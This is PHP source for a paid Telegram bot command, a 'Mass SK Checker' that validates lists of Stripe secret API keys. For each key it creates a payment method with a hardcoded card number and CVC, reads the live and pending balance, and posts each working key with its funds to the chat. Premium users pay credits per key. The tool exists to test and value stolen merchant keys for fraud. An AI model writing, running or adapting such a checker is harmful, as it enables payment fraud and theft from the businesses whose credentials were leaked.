<?php 
if ((strpos($message, "/msk") === 0)||(strpos($message, "!msk") === 0)||(strpos($message, ".msk") === 0)){
  if (($role == "PREMIUM") || ($role == "OWNER") || ($chtrole == "PRMEIUM"))
  {
    
$lista = substr($message, 5);
if(empty($lista))
{
  $msgsnd = reply_to($chatId,urlencode("
⌬ 𝙈𝙖𝙨𝙨 𝙎𝙆 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 

➜ 𝙉𝙊 𝙎𝙆 𝙁𝙊𝙐𝙉𝘿 !

𝘽𝙊𝙏 𝘽𝙔 $bowner

"),$messageId);
  exit();
}
$aray = array_unique(array_filter(gibarray($lista)));
$msgsnd = reply_to($chatId,urlencode("
⌬ 𝙈𝙖𝙨𝙨 𝙎𝙆 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 

¢нє¢кιηg ѕк....

𝘽𝙊𝙏 𝘽𝙔 - $bowner 

"),$messageId);
   $respon = json_decode($msgsnd, TRUE);
$message_id_1 = $respon['result']['message_id'];

    $bln = 0;
foreach ($aray as $sk)
{
  $bln = $bln + 1;
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]=4102770015058552&card[exp_month]=06&card[exp_year]=24&card[cvc]=997');  
$stripe1 = curl_exec($ch); 
if ((strpos($stripe1, 'declined')) || (strpos($stripe1, 'pm_')))
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'Authorization: Bearer '.$sk.'',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$stripe = curl_exec($ch);
//echo ($stripe);
$balance = trim(strip_tags(getStr($stripe,' "amount":',',')));
  $pbalance = trim(strip_tags(getStr($stripe,' "pending": [
    {
      "amount": ',',')));
$Currency = trim(strip_tags(getStr($stripe,'"currency": "','",')));
  $skmsg = urlencode("
𝗟𝗜𝗩𝗘 𝗦𝗞  ✅

𝗞𝗲𝘆 :  <code>$sk</code>

𝗕𝗔𝗟𝗔𝗡𝗖𝗘 : $balance 
𝗣𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗔𝗟𝗔𝗡𝗖𝗘: $pbalance
𝗖𝗨𝗥𝗥𝗘𝗡𝗖𝗬 : $Currency 

$header
  ");
  

}
elseif(strpos($stripe1, 'rate_limit'))
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'Authorization: Bearer '.$sk.'',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$stripe = curl_exec($ch);
$balance = trim(strip_tags(getStr($stripe,' "amount":',',')));
$Currency = trim(strip_tags(getStr($stripe,'"currency": "','",')));
  $pbalance = trim(strip_tags(getStr($stripe,' "pending": [
    {
      "amount": ',',')));
  
  $skmsg = urlencode("
𝗥𝗔𝗧𝗘 𝗟𝗜𝗠𝗜𝗧 𝗦𝗞 ⚠️

𝗞𝗲𝘆 :  <code>$sk</code>

𝗕𝗔𝗟𝗔𝗡𝗖𝗘 : $balance 
𝗣𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 : $pbalance
𝗖𝗨𝗥𝗥𝗘𝗡𝗖𝗬 : $Currency 

$header
  ");
}
elseif(strpos($stripe1, 'Your account cannot currently make live charges.'))
{
  $skmsg=urlencode("
𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌

𝗞𝗲𝘆:  <code>$sk</code>

𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : Your account cannot currently make live charges.

$header
");
}
elseif(strpos($stripe1, 'Expired API Key provided'))
{
   $skmsg=urlencode("
𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌

𝗞𝗲𝘆:  <code>$sk</code>

𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : Expired API Key provided.

$header
");
}
elseif(strpos($stripe1, 'The API key provided does not allow requests from your IP address.'))
{
   $skmsg=urlencode("
𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌

𝗞𝗲𝘆:  <code>$sk</code>

𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : The API key provided does not allow requests from your IP address.

$header
");
}
else
{
  $skmsg = Getstr($stripe1,'"message": "','"');
  $skmsg=urlencode("
𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌

𝗞𝗲𝘆:  <code>$sk</code>

𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : $skmsg

$header
");
}
$skbkp = "$skbkp $skmsg";
edit_message($chatId,urlencode("
⌬ 𝙈𝙖𝙨𝙨 𝙎𝙆 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 

").$skbkp.urlencode("

𝘽𝙊𝙏 𝘽𝙔 - $bowner 
"),$message_id_1); 

}
$cred = explode("\n", file_get_contents('func/premium.txt'));
foreach ($cred as $creds )
    {
      $cred1 = substr($creds,0,10);
      if ($cred1 == $userId)
      {
        $usercrd = substr($creds,11);
        $credit = $usercrd - $bln;
      $dir = "func/premium.txt";
        $contents = file_get_contents($dir);
$contents = str_replace($creds, '', $contents);
file_put_contents($dir, $contents);
$file = fopen('func/premium.txt','a');
fwrite($file,$userId." ".$credit."\n");
        break;
      }
    }
  }
  else 
  {
    reply_to($chatId,urlencode("
➜ 𝗨𝗦𝗘𝗥 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗙𝗥𝗘𝗘 
➜ 𝗔𝗦𝗞 𝗢𝗪𝗡𝗘𝗥 𝗧𝗢 𝗕𝗨𝗬 
"),$messageId);
  }
}
?>
